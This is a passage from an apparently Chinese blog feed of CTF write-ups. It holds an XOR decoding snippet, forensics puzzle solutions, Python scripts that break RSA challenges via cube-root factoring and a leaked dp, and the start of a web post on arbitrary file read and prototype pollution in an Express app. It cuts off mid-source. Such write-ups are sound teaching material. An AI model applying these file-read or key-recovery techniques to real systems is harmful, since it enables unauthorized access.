 97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 100, 121,   116, 105, 103, 115,  80,  97,  87, 107, 100, 121,    63, 104, 102, 115,  95,  97,  95, 107,  89, 121,   116,  40, 152, 140,  93,  97,  99, 107,  99,  55,    27,  26,   4,  18,  51,  97, 126, 107, 101, 121,   123, 117, 105, 122, 191,  96, 159, 104, 197, 124,   244, 111,   9, 122,  31, 106, 127, 102, 101, 118,   148, 120, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 111, 115,   2,  98,  95,  10, 108, 125,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107,  71, 121,    53,  40, 155, 140, 254,  97, 125, 107, 115,  61,    17,  14,   8,   6,  51,  21, 127,  59,   4,  11,    21,  15,  27,  18,  47,   9, 127,  45,  10,  23,     0, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  20, 107, 101, 121,   119, 104, 150, 140, 160, 158,  92, 107, 154, 134,   139, 151, 104, 115,  91,  65, 160, 148, 100, 121,   116, 104, 105, 115,  20,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107,  46, 121,   116, 104, 105, 112, 159,  64,  56, 105, 101, 122,   116, 104, 175, 112,  95,  97,  93, 107, 101, 122,   116, 104,  34, 112,  95,  97,  92, 107,  34, 121,   119,  17,   0,  29,  84,  34, 101,  55,   3,  72,    64,  15,  71,  23,  48,  21,  92,  18,  12,  23,    68,  43,  83,  47,   8,  40,  17,  37,  49,  37,    36,  26,   6,  21,  54,  13,  58,  24,  57,  56,    16,   5,   0,  29,  54,  18,  43,  25,   4,  13,    27,  26,  53,  55,  58,  18,  52,  31,  10,   9,    40,  14,  88,  71,  56,  79,  59,   4,  17, 134,   117, 105, 105,  38, 114,  97,  95, 107, 101, 134,   139, 104, 105, 115,  95,  33,  95, 107, 101, 127,   116, 104, 105, 245,  92,  97,  95, 123, 108, 121,   112,  14,  88,  71,  56,  96,  95, 122, 100, 121,   116, 104, 109,  53, 110,  85,  24, 107,  37, 120,   244, 105, 105,  76,  95,  97,  95,  84, 101, 121,   116,  96, 105, 114,  95,  96,  95,  84, 101, 121,   116, 104, 105, 115,  95,  94,  95, 107, 101, 120,   113, 104,  60, 242,  60,  89,  95, 105, 121, 121,   116, 104, 105, 115,  95,  97,  21, 107, 101, 121,    63, 104, 105, 115, 111,  97,  95, 104, 101, 121,   117, 104,  89, 115,  21,  98,  95, 107, 101, 121,    55, 104, 124, 101, 207,  96,  95, 107,  49,  16,    25,  13,  26,  83,  17,   4,  40,  75,  55,  22,    25,   9,   7, 115,  83, 119, 207, 106, 103, 121,    39,  17,   4,  17,  48,  13,  95,  96,  67, 233,   117, 104, 105,  50,  45,   8,  62,   7, 101, 104,    65, 248, 104, 115,  95,  34,  48,  30,  23,  16,    17,  26,  73,  61,  58,  22,  95,  73, 101, 125,   116,  89,  97, 251,  71,  97,  95, 187, 103, 121,   116,   0, 104, 115,  95,  97,  95, 207, 233, 238,   179, 192, 229, 228, 152,  97,  95, 107, 101, 127,   116, 107, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 125,   116, 235, 121, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101,  93,   119, 104, 105, 115,  95, 126,  95, 107, 101, 113,    39,  29,  11,  83,  18,  32,  22,  37, 101, 121,   116, 104, 106,  10,  54,  15,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97&#125;;  size_t size = 0x2E00;  for ( j = 0; j &lt; (int)size; ++j )    data[j] ^= key[j % 10];  v4 = fopen("daidai", "wb+");  fwrite(data, size, 1u, v4);  return 0;&#125;</code></pre><p>得到的文件是一个 Word 6.0 文件，打开后提示<br>My friend, I said, there is really no flag here, why don’t you believe me?</p><p>找到字符串 ，发现附近比较可疑</p><p>对全部内容进行xor，可找到完整flag</p><h3 id="鸣雏恋"><a href="#鸣雏恋" class="headerlink" title="鸣雏恋"></a>鸣雏恋</h3><p>binwalk提取doc文件，有一个压缩包，找到key里面有线索，是零宽字节，解出密码。</p><p>压缩包还有一个压缩包，用密码解压得十二万个图片，可以猜想为二进制即01或者黑白，用脚本转换为了二进制得flag。</p><pre class="language-python" data-language="python"><code class="language-python">white <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'C:\Users\Administrator\Desktop\鸣雏恋_2dad763070b79f50c4635a906359909a\鸣雏恋\_rels\love\out\0.png'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>black <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'C:\Users\Administrator\Desktop\鸣雏恋_2dad763070b79f50c4635a906359909a\鸣雏恋\_rels\love\out\1.png'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#注意要填文件真实的地址</span>flag <span class="token operator">=</span> <span class="token string">''</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">129488</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    color <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'C:\Users\Administrator\Desktop\鸣雏恋_2dad763070b79f50c4635a906359909a\鸣雏恋\_rels\love\out\%d.png'</span><span class="token operator">%</span>i<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>color <span class="token operator">==</span> white<span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token string">'0'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token string">'1'</span><span class="token comment">#把二进制数转为字符串</span>ans <span class="token operator">=</span> <span class="token string">''</span>length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">8</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>    ans <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span></code></pre><p>输出得二进制字符串</p><p>转字符串</p><p>根据提示，base64转hex，另存为png</p><p>得到flag</p><h3 id="ChieftainsSecret"><a href="#ChieftainsSecret" class="headerlink" title="ChieftainsSecret"></a>ChieftainsSecret</h3><p>binwalk 出一个压缩包</p><p>得到一张图片和一个csv TLE5501角度传感器，可以看到接口的对应关系通过 pc1-pc2 pc3-pc4  算出具体角度最后通过角度偏移得到打电话的数字</p><p>77085962457</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="myRSA"><a href="#myRSA" class="headerlink" title="myRSA"></a>myRSA</h3><p>等了一年终于连上了远程，直接拿flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">109291726712521562723217799066595465738514008562793813124735859077003607567378308344900227726005943523435691922275823930699185558905584992475684350943587216218159563567105178716429607251904576481331913955542279314418005710062312937628773101937560276030946008602896333498620895794065652328753887107382421236463</span><span class="token comment"># 发送b'\x01'的数据</span>m1 <span class="token operator">=</span> <span class="token number">9525397945159597083139236796554389057349388348561320860497256507608704178409073111423041648854415731502829246163813817887013295691211115103559158067048812940460342194773168560663306267552081548022969259450140126995928980812391022443278295051940120607312916391873625551459919069565401135463687861822761080960205441980160935262098587017605666572800848834634719283023350989003155672616785656418280486284252404327230995895334350449329496820373234495050858491300214136</span>flag <span class="token operator">=</span> <span class="token number">84714851061101551104842512208187516497690941059475723791750410942286241438698723551108297972855709502813510704312734246065654513821412192005193874395178433209848447807820345594430525933303605443157096791247595647420106894826618667916444279408290598367546651937728210043377385005880582654352783857030860269528710293017844982383988131043975713555798776601699577367436001411779466011751454954293920819863328114688953193568821221654373376635664655139419988801273771425680451278262871578890722408740436473781164730132065673797985283333324587469932990362283302547046173192527601753522974618089085155465973571933897481911626440582347862648387324192155488169555320343590638542052353093371100231443955010712018714258942911513526907631585015690345636535765895659959658571378505136</span>t <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>m1<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token comment"># print(t)</span><span class="token keyword">while</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>t<span class="token operator">*</span>t<span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span>n<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>    t <span class="token operator">=</span> t<span class="token operator">-</span><span class="token number">1</span>t2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>t<span class="token operator">*</span>t<span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span>n<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token punctuation">(</span>t<span class="token operator">+</span>t2<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>q <span class="token operator">=</span> n<span class="token operator">//</span>px <span class="token operator">=</span> p<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">3</span><span class="token operator">*</span>q <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token operator">+</span> q<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">+</span> <span class="token number">3</span><span class="token operator">*</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> y <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">*</span>q <span class="token operator">+</span> p <span class="token operator">+</span> qc <span class="token operator">=</span> <span class="token punctuation">(</span>flag<span class="token operator">//</span><span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span><span class="token number">65537</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><img src="/article/2021xyb/1629541706(1).png" class="" title="1629541706(1)" loading="lazy"><h3 id="Random-RSA"><a href="#Random-RSA" class="headerlink" title="Random_RSA"></a>Random_RSA</h3><p>懒得开虚拟机，python2没有密码库，所以上面是用python2跑出来的dp，下面解密用的python3。</p><p>ps:这个题好像必须得用python2跑dp，py3的MT算法似乎参数有点不同，跑出来的数据也不同。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># import random</span><span class="token comment"># import binascii</span><span class="token comment"># import os</span><span class="token comment"># tmp = [[58, 53, 122], [145, 124, 244], [5, 19, 192], [255, 23, 64], [57, 113, 194], [246, 205, 162], [112, 87, 95], [215, 147, 105], [16, 131, 38], [234, 36, 46], [68, 61, 146], [148, 61, 9], [139, 77, 32], [96, 56, 160], [121, 76, 17], [114, 246, 92], [178, 206, 60], [168, 147, 26], [168, 41, 68], [24, 93, 84], [175, 43, 88], [147, 97, 153], [42, 94, 45], [150, 103, 127], [68, 163, 62], [165, 37, 89], [219, 248, 59], [241, 182, 8], [140, 211, 146], [88, 226, 2], [48, 150, 56], [87, 109, 255], [227, 216, 65], [23, 190, 10], [5, 25, 64], [6, 12, 124], [53, 113, 124], [255, 192, 158], [61, 239, 5], [62, 108, 86], [123, 44, 64], [195, 192, 30], [30, 82, 95], [56, 178, 165], [68, 77, 239], [106, 247, 226], [17, 46, 114], [91, 71, 156], [157, 43, 182], [146, 6, 42], [148, 143, 161], [108, 33, 139], [139, 169, 157], [71, 140, 25], [28, 153, 26], [241, 221, 235], [28, 131, 141], [159, 111, 184], [47, 206, 11], [220, 152, 157], [41, 213, 97], [4, 220, 10], [77, 13, 248], [94, 140, 110], [25, 250, 226], [218, 102, 109], [189, 238, 66], [91, 18, 131], [23, 239, 190], [159, 33, 72], [183, 78, 208], [209, 213, 101], [111, 50, 220], [166, 104, 233], [170, 144, 10], [187, 87, 175], [195, 59, 104], [165, 179, 179], [99, 247, 153], [195, 61, 100], [223, 159, 165], [230, 93, 184], [87, 28, 35], [35, 122, 38], [158, 188, 163], [229, 192, 222], [12, 12, 192], [207, 95, 224], [127, 113, 137], [22, 114, 143], [13, 45, 144], [70, 140, 211], [57, 101, 42], [132, 62, 129], [40, 128, 124], [1, 132, 161], [164, 33, 133], [252, 201, 32], [8, 18, 247], [1, 88, 55], [201, 135, 186], [101, 254, 125], [236, 196, 39], [148, 24, 103], [101, 29, 253], [97, 156, 64], [90, 103, 91], [50, 48, 80], [206, 22, 93], [11, 114, 174], [61, 132, 247], [215, 32, 232], [95, 128, 90], [57, 35, 228], [163, 143, 107], [178, 250, 28], [64, 107, 225], [106, 115, 207], [85, 134, 21], [118, 201, 76], [234, 34, 22], [241, 236, 122], [111, 185, 127], [1, 26, 164], [254, 57, 117], [243, 27, 32], [161, 88, 80], [50, 165, 93], [87, 182, 216], [184, 159, 63], [167, 166, 123], [37, 78, 33], [186, 81, 58], [48, 3, 239], [70, 186, 13], [56, 108, 178], [54, 55, 235], [105, 180, 105], [16, 194, 98], [136, 11, 41], [18, 203, 79], [185, 114, 170], [148, 181, 223], [118, 57, 160], [23, 250, 181], [235, 219, 228], [44, 151, 38], [185, 224, 134], [42, 162, 122], [3, 9, 158], [129, 245, 2], [66, 241, 92], [80, 124, 36]]</span><span class="token comment"># res = [55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81]</span><span class="token comment"># seeds = [4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579]</span><span class="token comment"># dp = bytearray()</span><span class="token comment"># for i in range(0, len(seeds)):</span><span class="token comment">#     random.seed(seeds[i])</span><span class="token comment">#     rands = []</span><span class="token comment">#     for j in range(0,4):</span><span class="token comment">#         rands.append(random.randint(0,255))</span><span class="token comment">#     print(str(rands))</span><span class="token comment">#     dp.append(res[i] ^ rands[i%4])</span><span class="token comment"># print(dp)</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2dp <span class="token operator">=</span> <span class="token number">5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> dp<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    _ <span class="token operator">=</span> dp <span class="token operator">*</span> e <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> _ <span class="token operator">%</span> i<span class="token punctuation">:</span>            p <span class="token operator">=</span> _ <span class="token operator">//</span> i <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> n <span class="token operator">%</span> p<span class="token punctuation">:</span>                q <span class="token operator">=</span> n <span class="token operator">//</span> p                phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>                d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> dn<span class="token operator">=</span><span class="token number">81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391</span>ct<span class="token operator">=</span><span class="token number">61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151</span>e <span class="token operator">=</span> <span class="token number">0x10001</span>d <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>e<span class="token punctuation">,</span> dp<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>ct<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><img src="/article/2021xyb/1.png" class="" width="1" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021巅峰极客一道题——ezjs</title>
      <link href="article/2021dfjk/"/>
      <url>article/2021dfjk/</url>
      
        <content type="html"><![CDATA[<p>深入学习一下JavaScript的原型链污染漏洞</p><span id="more"></span><p>我是巅峰fw，就摸出来一道题目，好好学习下原型链污染。以下为做题视角。</p><h2 id="Web-ezjs"><a href="#Web-ezjs" class="headerlink" title="Web-ezjs"></a>Web-ezjs</h2><h3 id="第一步-任意文件读取"><a href="#第一步-任意文件读取" class="headerlink" title="第一步 - 任意文件读取"></a>第一步 - 任意文件读取</h3><p>打开题目发现非常简洁的登陆，以为是sql注入，随便输入以下发现直接进入了。</p><p>登陆限制username和password大于5位</p><img src="/article/2021dfjk/image-20210803151950579.png" class="" title="image-20210803151950579" loading="lazy"><p>图片显示这块明显有异常，对应GET请求的newing参数</p><img src="/article/2021dfjk/image-20210803142727224.png" class="" title="image-20210803142727224" loading="lazy"><h4 id="存在任意文件读取"><a href="#存在任意文件读取" class="headerlink" title="存在任意文件读取"></a>存在任意文件读取</h4><img src="/article/2021dfjk/image-20210803142841282.png" class="" title="image-20210803142841282" loading="lazy"><p>利用此处读取了部分源码如下</p><p><code>/app/routes/index.js</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> <span class="token punctuation">&#123;</span>body<span class="token punctuation">,</span> validationResult<span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-validator'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> validator <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">min</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"username is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property 